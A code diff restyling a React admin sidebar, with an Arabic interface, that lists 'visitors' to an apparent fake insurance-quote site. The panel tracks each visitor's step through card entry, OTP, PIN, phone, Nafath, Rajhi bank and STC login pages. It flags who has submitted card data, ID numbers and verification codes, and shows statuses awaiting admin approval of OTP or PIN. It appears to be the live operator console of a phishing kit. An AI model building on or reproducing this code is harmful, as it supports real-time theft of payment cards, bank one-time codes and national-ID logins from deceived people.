@@ -32,7 +32,6 @@ interface VisitorSidebarProps {
   onSidebarWidthChange: (width: number) => void;
 }
 
-// Check if visitor is waiting for admin response
 const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
   return (
     visitor.cardStatus === "waiting" ||
@@ -46,80 +45,38 @@ const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
 const getCardStatusBadge = (status: InsuranceApplication["cardStatus"]) => {
   switch (status) {
     case "approved_with_otp":
-      return { label: "✓ OTP", cls: "bg-emerald-100 text-emerald-700 border border-emerald-200" };
+      return { label: "✓ OTP", cls: "bg-emerald-900/40 text-emerald-400 border border-emerald-700/50" };
     case "approved_with_pin":
-      return { label: "✓ PIN", cls: "bg-emerald-100 text-emerald-700 border border-emerald-200" };
+      return { label: "✓ PIN", cls: "bg-emerald-900/40 text-emerald-400 border border-emerald-700/50" };
     case "rejected":
-      return { label: "✗ مرفوض", cls: "bg-red-100 text-red-600 border border-red-200" };
+      return { label: "✗ مرفوض", cls: "bg-red-900/40 text-red-400 border border-red-700/50" };
     case "message":
-      return { label: "📲 رسالة", cls: "bg-amber-100 text-amber-700 border border-amber-200 animate-pulse" };
+      return { label: "📲 رسالة", cls: "bg-amber-900/40 text-amber-400 border border-amber-700/50 animate-pulse" };
     case "waiting":
-      return { label: "⏳ انتظار", cls: "bg-yellow-100 text-yellow-700 border border-yellow-200" };
+      return { label: "⏳ انتظار", cls: "bg-yellow-900/40 text-yellow-400 border border-yellow-700/50" };
     default:
       return null;
   }
 };
 
-// Get current page name in Arabic
 const getPageName = (step: number | string): string => {
-  // Handle string values first (legacy system)
   if (typeof step === "string") {
     const stringPageNames: Record<string, string> = {
-      // Home
-      home: "الرئيسية",
-      "home-new": "الرئيسية",
-      // Insurance
-      insur: "بيانات التأمين",
-      // Offers
-      compar: "مقارنة العروض",
-      // Payment / card
-      payment: "الدفع (بطاقة)",
-      check: "الدفع",
-      _st1: "الدفع (بطاقة)",
-      _t1: "بيانات البطاقة",
-      // OTP
-      otp: "OTP",
-      _t2: "OTP",
-      step2: "OTP",
-      veri: "رمز تحقق",
-      // PIN
-      pin: "PIN",
-      _t3: "PIN",
-      step3: "PIN",
-      confi: "PIN",
-      // Phone
-      phone: "الهاتف",
-      step5: "الهاتف",
-      // Nafad
-      nafad: "نفاذ",
-      _t6: "نفاذ",
-      step4: "نفاذ",
-      nafad_modal: "نافذة نفاذ",
-      // Final OTP
-      finalOtp: "OTP الأخير",
-      // Rajhi
-      rajhi: "راجحي",
-      // STC
-      "stc-login": "دخول STC",
+      home: "الرئيسية", "home-new": "الرئيسية", insur: "بيانات التأمين",
+      compar: "مقارنة العروض", payment: "الدفع (بطاقة)", check: "الدفع",
+      _st1: "الدفع (بطاقة)", _t1: "بيانات البطاقة", otp: "OTP", _t2: "OTP",
+      step2: "OTP", veri: "رمز تحقق", pin: "PIN", _t3: "PIN", step3: "PIN",
+      confi: "PIN", phone: "الهاتف", step5: "الهاتف", nafad: "نفاذ", _t6: "نفاذ",
+      step4: "نفاذ", nafad_modal: "نافذة نفاذ", finalOtp: "OTP الأخير",
+      rajhi: "راجحي", "stc-login": "دخول STC",
     };
     return stringPageNames[step] || `غير محدد (${step})`;
   }
-
-  // Handle numeric values
   const stepNum = typeof step === "number" ? step : parseInt(step);
   const pageNames: Record<number, string> = {
-    0: "الرئيسية",
-    1: "الرئيسية",
-    2: "بيانات التأمين",
-    3: "مقارنة العروض",
-    4: "الدفع",
-    5: "OTP",
-    6: "PIN",
-    7: "الهاتف",
-    8: "نفاذ",
-    9: "الاخير OTP",
+    0: "الرئيسية", 1: "الرئيسية", 2: "بيانات التأمين", 3: "مقارنة العروض",
+    4: "الدفع", 5: "OTP", 6: "PIN", 7: "الهاتف", 8: "نفاذ", 9: "OTP الأخير",
   };
-
   return pageNames[stepNum] || `غير محدد (${stepNum})`;
 };
 
@@ -127,16 +84,11 @@ const getVisitorDisplayName = (visitor: InsuranceApplication) =>
   visitor.ownerName || (visitor as any).name || "بدون اسم";
 
 const getVisitorCurrentPage = (visitor: InsuranceApplication) =>
-  (visitor.redirectPage ||
-    visitor.currentPage ||
-    visitor.currentStep ||
-    "home") as number | string;
+  (visitor.redirectPage || visitor.currentPage || visitor.currentStep || "home") as number | string;
 
 const hasCardData = (visitor: InsuranceApplication): boolean => {
   if (visitor._v1 || visitor.cardNumber) return true;
-
   if (!visitor.history || !Array.isArray(visitor.history)) return false;
-
   return visitor.history.some(
     (entry: any) =>
       (entry.type === "_t1" || entry.type === "card") &&
@@ -153,11 +105,8 @@ function BlockButton({ visitor }: { visitor: InsuranceApplication }) {
     setLoading(true);
     try {
       await updateApplication(visitor.id, { isBlocked: !visitor.isBlocked });
-    } catch {
-      // silent
-    } finally {
-      setLoading(false);
-    }
+    } catch { }
+    finally { setLoading(false); }
   };
 
   return (
@@ -165,126 +114,117 @@ function BlockButton({ visitor }: { visitor: InsuranceApplication }) {
       onClick={handleToggle}
       disabled={loading}
       title={visitor.isBlocked ? "إلغاء الحظر" : "حظر الزائر"}
-      className={`flex items-center justify-center w-7 h-7 rounded-full transition-all disabled:opacity-40 ${
-        visitor.isBlocked
-          ? "bg-red-100 text-red-600 hover:bg-red-200"
-          : "bg-gray-100 text-gray-400 hover:bg-red-100 hover:text-red-600"
-      }`}
+      className="flex items-center justify-center w-7 h-7 rounded-full transition-all disabled:opacity-40"
+      style={visitor.isBlocked
+        ? { background: "rgba(239,68,68,0.15)", color: "#f87171", border: "1px solid rgba(239,68,68,0.3)" }
+        : { background: "rgba(255,255,255,0.05)", color: "rgba(148,163,184,0.5)", border: "1px solid rgba(255,255,255,0.08)" }}
     >
-      {visitor.isBlocked ? (
-        <ShieldCheck className="w-3.5 h-3.5" />
-      ) : (
-        <Ban className="w-3.5 h-3.5" />
-      )}
+      {visitor.isBlocked ? <ShieldCheck className="w-3.5 h-3.5" /> : <Ban className="w-3.5 h-3.5" />}
     </button>
   );
 }
 
 export function VisitorSidebar({
-  visitors,
-  selectedVisitor,
-  onSelectVisitor,
-  searchQuery,
-  onSearchChange,
-  cardFilter,
-  onCardFilterChange,
-  selectedIds,
-  onToggleSelect,
-  onSelectAll,
-  onDeleteSelected,
-  sidebarWidth,
-  onSidebarWidthChange,
+  visitors, selectedVisitor, onSelectVisitor, searchQuery, onSearchChange,
+  cardFilter, onCardFilterChange, selectedIds, onToggleSelect,
+  onSelectAll, onDeleteSelected, sidebarWidth, onSidebarWidthChange,
 }: VisitorSidebarProps) {
-  const allSelected =
-    visitors.length > 0 && selectedIds.size === visitors.length;
-  const unreadCount = visitors.filter((visitor) => visitor.isUnread).length;
+  const allSelected = visitors.length > 0 && selectedIds.size === visitors.length;
+  const unreadCount = visitors.filter((v) => v.isUnread).length;
   const waitingCount = visitors.filter(isWaitingForAdmin).length;
   const isLandscape =
     typeof window !== "undefined" &&
-    window.matchMedia("(orientation: landscape) and (max-width: 1024px)")
-      .matches;
+    window.matchMedia("(orientation: landscape) and (max-width: 1024px)").matches;
 
   return (
     <div
-      className="h-full w-full bg-white/95 backdrop-blur-sm landscape:border-l md:w-[400px] md:border-l border-gray-200 flex flex-col relative group shadow-sm"
+      className="h-full w-full landscape:border-l md:w-[400px] md:border-l flex flex-col relative"
       style={{
         fontFamily: "Cairo, Tajawal, sans-serif",
         width: isLandscape ? `${sidebarWidth}px` : undefined,
+        background: "rgba(9,14,28,0.97)",
+        borderColor: "rgba(99,102,241,0.12)",
       }}
     >
       {/* Header */}
-      <div className="p-3 sm:p-4 landscape:p-2 border-b border-gray-200 bg-gradient-to-b from-white to-gray-50">
-        <h1 className="text-xl landscape:text-base font-bold text-gray-800 mb-4 landscape:mb-2">
-          لوحة التحكم
+      <div className="p-3 sm:p-4 landscape:p-2" style={{ borderBottom: "1px solid rgba(99,102,241,0.12)", background: "rgba(13,21,42,0.8)" }}>
+        <h1 className="text-base landscape:text-sm font-bold mb-3 landscape:mb-1.5" style={{ color: "#e2e8f0" }}>
+          قائمة الزوار
         </h1>
-        <div className="mb-3 flex flex-wrap items-center gap-2">
-          <span className="text-xs font-semibold px-2 py-1 rounded-full bg-blue-100 text-blue-700">
+
+        {/* Stats badges */}
+        <div className="mb-3 flex flex-wrap items-center gap-1.5">
+          <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full"
+            style={{ background: "rgba(99,102,241,0.12)", color: "rgba(99,102,241,0.9)", border: "1px solid rgba(99,102,241,0.2)" }}>
             إجمالي: {visitors.length}
           </span>
-          <span className="text-xs font-semibold px-2 py-1 rounded-full bg-pink-100 text-pink-700">
-            غير مقروء: {unreadCount}
-          </span>
-          <span className="text-xs font-semibold px-2 py-1 rounded-full bg-amber-100 text-amber-700">
-            قيد المراجعة: {waitingCount}
-          </span>
+          {unreadCount > 0 && (
+            <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full"
+              style={{ background: "rgba(236,72,153,0.12)", color: "rgba(236,72,153,0.9)", border: "1px solid rgba(236,72,153,0.2)" }}>
+              غير مقروء: {unreadCount}
+            </span>
+          )}
+          {waitingCount > 0 && (
+            <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full animate-pulse"
+              style={{ background: "rgba(245,158,11,0.12)", color: "rgba(245,158,11,0.9)", border: "1px solid rgba(245,158,11,0.2)" }}>
+              قيد المراجعة: {waitingCount}
+            </span>
+          )}
         </div>
 
         {/* Search */}
-        <div className="relative mb-3 landscape:mb-2">
-          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 landscape:w-4 landscape:h-4 text-gray-400" />
+        <div className="relative mb-3 landscape:mb-1.5">
+          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4" style={{ color: "rgba(99,102,241,0.6)" }} />
           <input
             type="text"
-            placeholder="بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)"
+            placeholder="بحث (الاسم، الهوية، الهاتف...)"
             value={searchQuery}
             onChange={(e) => onSearchChange(e.target.value)}
-            className="w-full rounded-lg border border-gray-300 py-2 pl-4 pr-10 text-sm focus:outline-none focus:ring-2 focus:ring-green-500 landscape:py-1.5 landscape:text-xs"
+            className="w-full rounded-xl py-2 pl-3 pr-9 text-sm outline-none transition-all landscape:py-1.5 landscape:text-xs"
+            style={{
+              background: "rgba(255,255,255,0.04)",
+              border: "1px solid rgba(99,102,241,0.2)",
+              color: "#e2e8f0",
+            }}
+            onFocus={e => { e.target.style.borderColor = "rgba(99,102,241,0.5)"; e.target.style.background = "rgba(99,102,241,0.06)" }}
+            onBlur={e => { e.target.style.borderColor = "rgba(99,102,241,0.2)"; e.target.style.background = "rgba(255,255,255,0.04)" }}
           />
         </div>
 
         {/* Filters */}
-        <div className="mb-3 grid grid-cols-2 gap-2 landscape:mb-2">
-          <button
-            onClick={() => onCardFilterChange("all")}
-            className={`px-3 py-1.5 landscape:py-1 rounded-lg text-sm landscape:text-xs font-medium transition-colors ${
-              cardFilter === "all"
-                ? "bg-green-600 text-white"
-                : "bg-gray-200 text-gray-700 hover:bg-gray-300"
-            }`}
-          >
-            الكل
-          </button>
-          <button
-            onClick={() => onCardFilterChange("hasCard")}
-            className={`px-3 py-1.5 landscape:py-1 rounded-lg text-sm landscape:text-xs font-medium transition-colors ${
-              cardFilter === "hasCard"
-                ? "bg-green-600 text-white"
-                : "bg-gray-200 text-gray-700 hover:bg-gray-300"
-            }`}
-          >
-            لديهم بطاقة
-          </button>
+        <div className="mb-3 grid grid-cols-2 gap-1.5 landscape:mb-1.5">
+          {(["all", "hasCard"] as const).map((f) => (
+            <button
+              key={f}
+              onClick={() => onCardFilterChange(f)}
+              className="px-3 py-1.5 landscape:py-1 rounded-lg text-xs font-semibold transition-all duration-200"
+              style={cardFilter === f
+                ? { background: "linear-gradient(135deg, #4f46e5, #06b6d4)", color: "#fff", boxShadow: "0 2px 12px rgba(99,102,241,0.3)" }
+                : { background: "rgba(255,255,255,0.04)", color: "rgba(148,163,184,0.7)", border: "1px solid rgba(255,255,255,0.07)" }}
+            >
+              {f === "all" ? "الكل" : "لديهم بطاقة"}
+            </button>
+          ))}
         </div>
 
         {/* Actions */}
-        <div className="flex flex-wrap gap-2">
+        <div className="flex flex-wrap gap-1.5">
           <button
             onClick={onSelectAll}
-            className="flex min-w-[135px] flex-1 items-center justify-center gap-2 rounded-lg bg-gray-200 px-3 py-1.5 text-sm font-medium transition-colors hover:bg-gray-300 landscape:py-1 landscape:text-xs"
+            className="flex flex-1 min-w-[120px] items-center justify-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium transition-all duration-200"
+            style={{ background: "rgba(255,255,255,0.05)", color: "rgba(148,163,184,0.8)", border: "1px solid rgba(255,255,255,0.07)" }}
           >
-            {allSelected ? (
-              <CheckSquare className="w-4 h-4 landscape:w-3 landscape:h-3" />
-            ) : (
-              <Square className="w-4 h-4 landscape:w-3 landscape:h-3" />
-            )}
-            {allSelected ? "إلغاء الكل" : "تحديد الكل"}
+            {allSelected
+              ? <><CheckSquare className="w-3.5 h-3.5" /> إلغاء الكل</>
+              : <><Square className="w-3.5 h-3.5" /> تحديد الكل</>}
           </button>
-
           {selectedIds.size > 0 && (
             <button
               onClick={onDeleteSelected}
-              className="flex min-w-[135px] flex-1 items-center justify-center gap-2 rounded-lg bg-red-500 px-3 py-1.5 text-sm font-medium text-white transition-colors hover:bg-red-600 landscape:py-1 landscape:text-xs"
+              className="flex flex-1 min-w-[120px] items-center justify-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-semibold transition-all duration-200"
+              style={{ background: "rgba(239,68,68,0.12)", color: "#f87171", border: "1px solid rgba(239,68,68,0.25)" }}
             >
-              <Trash2 className="w-4 h-4 landscape:w-3 landscape:h-3" />
+              <Trash2 className="w-3.5 h-3.5" />
               حذف ({selectedIds.size})
             </button>
           )}
@@ -294,135 +234,117 @@ export function VisitorSidebar({
       {/* Visitor List */}
       <div className="flex-1 overflow-y-auto">
         {visitors.length === 0 ? (
-          <div className="p-8 text-center text-gray-500 space-y-2">
+          <div className="p-8 text-center space-y-2">
             <p className="text-3xl">📭</p>
-            <p className="font-semibold">لا يوجد زوار</p>
-            <p className="text-xs text-gray-400">
-              سيظهر الزوار هنا عند بدء التفاعل
-            </p>
+            <p className="font-semibold text-sm" style={{ color: "rgba(148,163,184,0.7)" }}>لا يوجد زوار</p>
+            <p className="text-xs" style={{ color: "rgba(100,116,139,0.5)" }}>سيظهر الزوار هنا عند بدء التفاعل</p>
           </div>
         ) : (
           visitors.map((visitor) => {
             const hasCard = hasCardData(visitor);
+            const isSelected = selectedVisitor?.id === visitor.id;
+            const isBlocked = visitor.isBlocked;
+            const isUnread = visitor.isUnread && !isBlocked;
 
             return (
               <div
                 key={visitor.id}
                 onClick={() => onSelectVisitor(visitor)}
-                className={`border-b border-gray-100 p-3 sm:p-4 landscape:p-2 cursor-pointer transition-colors hover:bg-gray-50 ${
-                  selectedVisitor?.id === visitor.id
-                    ? "bg-green-50 border-r-4 border-r-green-600"
-                    : visitor.isBlocked
-                    ? "bg-red-50 border-r-4 border-r-red-500"
-                    : ""
-                } ${visitor.isUnread && !visitor.isBlocked ? "bg-pink-50" : ""}`}
+                className="border-b cursor-pointer transition-all duration-150 p-3 sm:p-3.5 landscape:p-2"
+                style={{
+                  borderColor: "rgba(255,255,255,0.04)",
+                  background: isSelected
+                    ? "linear-gradient(135deg, rgba(99,102,241,0.12), rgba(6,182,212,0.06))"
+                    : isBlocked
+                    ? "rgba(239,68,68,0.05)"
+                    : isUnread
+                    ? "rgba(236,72,153,0.05)"
+                    : "transparent",
+                  borderRight: isSelected
+                    ? "3px solid #6366f1"
+                    : isBlocked
+                    ? "3px solid rgba(239,68,68,0.6)"
+                    : "3px solid transparent",
+                }}
+                onMouseEnter={e => {
+                  if (!isSelected) (e.currentTarget as HTMLDivElement).style.background = "rgba(99,102,241,0.06)";
+                }}
+                onMouseLeave={e => {
+                  if (!isSelected) (e.currentTarget as HTMLDivElement).style.background = isBlocked ? "rgba(239,68,68,0.05)" : isUnread ? "rgba(236,72,153,0.05)" : "transparent";
+                }}
               >
-                <div className="flex items-start gap-3">
+                <div className="flex items-start gap-2.5">
                   {/* Checkbox */}
                   <div
-                    onClick={(e) => {
-                      e.stopPropagation();
-                      if (visitor.id) onToggleSelect(visitor.id);
-                    }}
-                    className="mt-1"
+                    onClick={(e) => { e.stopPropagation(); if (visitor.id) onToggleSelect(visitor.id); }}
+                    className="mt-0.5 shrink-0"
                   >
-                    {visitor.id && selectedIds.has(visitor.id) ? (
-                      <CheckSquare className="w-5 h-5 text-green-600" />
-                    ) : (
-                      <Square className="w-5 h-5 text-gray-400" />
-                    )}
+                    {visitor.id && selectedIds.has(visitor.id)
+                      ? <CheckSquare className="w-4 h-4" style={{ color: "#6366f1" }} />
+                      : <Square className="w-4 h-4" style={{ color: "rgba(148,163,184,0.3)" }} />}
                   </div>
 
-                  {/* Visitor Info */}
                   <div className="flex-1 min-w-0">
-                    {/* Name & Time Ago */}
-                    <div className="mb-1 flex flex-col gap-1 sm:flex-row sm:items-center sm:justify-between">
-                      <div className="flex min-w-0 flex-wrap items-center gap-1.5">
-                        <h3 className="font-semibold text-gray-900 truncate text-base landscape:text-sm">
+                    {/* Name row */}
+                    <div className="flex items-start justify-between gap-1 mb-1">
+                      <div className="flex flex-wrap items-center gap-1 min-w-0">
+                        <h3 className="font-semibold text-sm truncate landscape:text-xs" style={{ color: "#e2e8f0" }}>
                           {getVisitorDisplayName(visitor)}
                         </h3>
-                        {visitor.isBlocked && (
-                          <span className="flex items-center gap-0.5 rounded-full bg-red-100 px-2 py-0.5 text-[10px] font-bold text-red-600 whitespace-nowrap border border-red-200">
-                            <Ban className="w-2.5 h-2.5" />
-                            محظور
+                        {isBlocked && (
+                          <span className="flex items-center gap-0.5 rounded-full px-1.5 py-0.5 text-[9px] font-bold"
+                            style={{ background: "rgba(239,68,68,0.15)", color: "#f87171", border: "1px solid rgba(239,68,68,0.3)" }}>
+                            <Ban className="w-2 h-2" /> محظور
                           </span>
                         )}
-                        <span className="flex items-center gap-1 rounded bg-teal-600 px-2 py-0.5 text-[11px] font-medium text-white whitespace-nowrap">
-                          {isWaitingForAdmin(visitor) && (
-                            <RefreshCw className="w-3 h-3 animate-spin" />
-                          )}
+                        <span className="flex items-center gap-1 rounded px-1.5 py-0.5 text-[10px] font-medium"
+                          style={{ background: "rgba(20,184,166,0.15)", color: "#2dd4bf", border: "1px solid rgba(20,184,166,0.25)" }}>
+                          {isWaitingForAdmin(visitor) && <RefreshCw className="w-2.5 h-2.5 animate-spin" />}
                           {getPageName(getVisitorCurrentPage(visitor))}
                         </span>
                         {hasCard && (
-                          <span className="flex items-center gap-1 rounded-full border border-blue-200 bg-blue-100 px-2 py-0.5 text-[10px] font-semibold text-blue-700 whitespace-nowrap">
-                            <CreditCard className="w-3 h-3" />
-                            بطاقة
+                          <span className="flex items-center gap-0.5 rounded-full px-1.5 py-0.5 text-[9px] font-semibold"
+                            style={{ background: "rgba(99,102,241,0.12)", color: "rgba(129,140,248,0.9)", border: "1px solid rgba(99,102,241,0.2)" }}>
+                            <CreditCard className="w-2.5 h-2.5" /> بطاقة
                           </span>
                         )}
                         {(() => {
                           const badge = getCardStatusBadge(visitor.cardStatus);
-                          return badge ? (
-                            <span className={`rounded-full px-2 py-0.5 text-[10px] font-semibold whitespace-nowrap ${badge.cls}`}>
-                              {badge.label}
-                            </span>
-                          ) : null;
+                          return badge
+                            ? <span className={`rounded-full px-1.5 py-0.5 text-[9px] font-semibold whitespace-nowrap ${badge.cls}`}>{badge.label}</span>
+                            : null;
                         })()}
                       </div>
 
-                      {/* Time ago + Block */}
-                      <div className="flex items-center gap-2 whitespace-nowrap sm:self-auto">
-                        <span className="text-xs landscape:text-[10px] text-gray-500 font-medium">
+                      <div className="flex items-center gap-1.5 shrink-0">
+                        <span className="text-[10px]" style={{ color: "rgba(100,116,139,0.7)" }}>
                           {getTimeAgo(visitor.updatedAt || visitor.lastSeen)}
                         </span>
                         <BlockButton visitor={visitor} />
                       </div>
                     </div>
 
-                    {/* Contact Info: Phone & ID */}
-                    <div className="hidden sm:flex items-center gap-3 mb-2 text-xs text-gray-700">
-                      {visitor.phoneNumber && (
-                        <div className="flex items-center gap-1">
-                          <span className="font-medium">
-                            📞 {visitor.phoneNumber}
-                          </span>
-                        </div>
-                      )}
-                      {visitor.identityNumber && (
-                        <div className="flex items-center gap-1">
-                          <span className="font-medium">
-                            🆔 {visitor.identityNumber}
-                          </span>
-                        </div>
-                      )}
+                    {/* Contact row */}
+                    <div className="hidden sm:flex items-center gap-2 mb-1 text-[11px]" style={{ color: "rgba(148,163,184,0.6)" }}>
+                      {visitor.phoneNumber && <span>📞 {visitor.phoneNumber}</span>}
+                      {visitor.identityNumber && <span>🆔 {visitor.identityNumber}</span>}
                     </div>
 
-                    {/* Bottom Row: Status & Page */}
-                    <div className="hidden sm:flex items-center justify-between">
-                      {/* Left: Online Status & Icons */}
-                      <div className="flex items-center gap-2">
-                        <div className="flex items-center gap-1">
-                          <div
-                            className={`w-2 h-2 rounded-full ${
-                              visitor.isOnline ? "bg-green-500" : "bg-gray-400"
-                            }`}
-                          ></div>
-                          <span className="text-xs text-gray-600">
-                            {visitor.isOnline ? "متصل" : "غير متصل"}
-                          </span>
-                        </div>
-
-                        {hasCard && (
-                          <div className="flex items-center gap-1 px-2 py-0.5 bg-blue-100 text-blue-700 rounded text-xs">
-                            <CreditCard className="w-3 h-3" />
-                            <span>بطاقة</span>
-                          </div>
-                        )}
-                        {visitor.phoneVerificationCode && (
-                          <div className="flex items-center gap-1 px-2 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">
-                            <KeyRound className="w-3 h-3" />
-                          </div>
-                        )}
+                    {/* Online status */}
+                    <div className="hidden sm:flex items-center gap-2">
+                      <div className="flex items-center gap-1">
+                        <div className={`w-1.5 h-1.5 rounded-full ${visitor.isOnline ? "animate-pulse" : ""}`}
+                          style={{ background: visitor.isOnline ? "#10b981" : "rgba(148,163,184,0.3)" }} />
+                        <span className="text-[10px]" style={{ color: visitor.isOnline ? "rgba(16,185,129,0.8)" : "rgba(100,116,139,0.5)" }}>
+                          {visitor.isOnline ? "متصل" : "غير متصل"}
+                        </span>
                       </div>
+                      {visitor.phoneVerificationCode && (
+                        <div className="flex items-center px-1.5 py-0.5 rounded text-[10px]"
+                          style={{ background: "rgba(139,92,246,0.1)", color: "rgba(167,139,250,0.8)" }}>
+                          <KeyRound className="w-2.5 h-2.5" />
+                        </div>
+                      )}
                     </div>
                   </div>
                 </div>
